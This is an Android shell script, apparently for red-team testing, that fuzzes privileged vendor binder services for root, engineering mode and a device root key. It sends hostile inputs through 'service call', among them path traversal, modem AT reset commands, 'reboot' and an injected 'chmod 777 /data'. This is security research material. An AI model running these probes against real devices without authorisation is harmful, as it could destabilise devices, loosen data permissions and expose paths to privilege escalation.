#!/system/bin/sh
# Fuzz High-Value Services
# Targets: APNWidgetRootService (15), EngineeringModeService (7), DeviceRootKeyService (5)

log_fuzz() {
    echo "$(date) - $1"
    log -t "RedTeamFuzz" "$1"
}

fuzz_apn() {
    log_fuzz "Fuzzing APNWidgetRootService (Methods 1-15)..."
    for i in $(seq 1 15); do
        # String inputs
        service call com.smartcom.root.APNWidgetRootService $i s16 "test"
        service call com.smartcom.root.APNWidgetRootService $i s16 "root"
        service call com.smartcom.root.APNWidgetRootService $i s16 "../../../"
        # Int inputs
        service call com.smartcom.root.APNWidgetRootService $i i32 0
        service call com.smartcom.root.APNWidgetRootService $i i32 1
        service call com.smartcom.root.APNWidgetRootService $i i32 -1
    done
}

fuzz_eng() {
    log_fuzz "Fuzzing EngineeringModeService (Methods 1-7)..."
    for i in $(seq 1 7); do
        service call EngineeringModeService $i s16 "AT+LOG"
        service call EngineeringModeService $i s16 "AT+RESET"
        service call EngineeringModeService $i s16 "reboot"
        service call EngineeringModeService $i s16 "chmod 777 /data"
        service call EngineeringModeService $i i32 1337
    done
}

fuzz_rootkey() {
    log_fuzz "Fuzzing DeviceRootKeyService (Methods 1-5)..."
    for i in $(seq 1 5); do
        service call DeviceRootKeyService $i i32 0 i32 0
        service call DeviceRootKeyService $i i32 1 i32 0
        service call DeviceRootKeyService $i s16 "key"
    done
}

log_fuzz "Starting Service Fuzzing..."
fuzz_apn
fuzz_eng
fuzz_rootkey
log_fuzz "Fuzzing Complete."
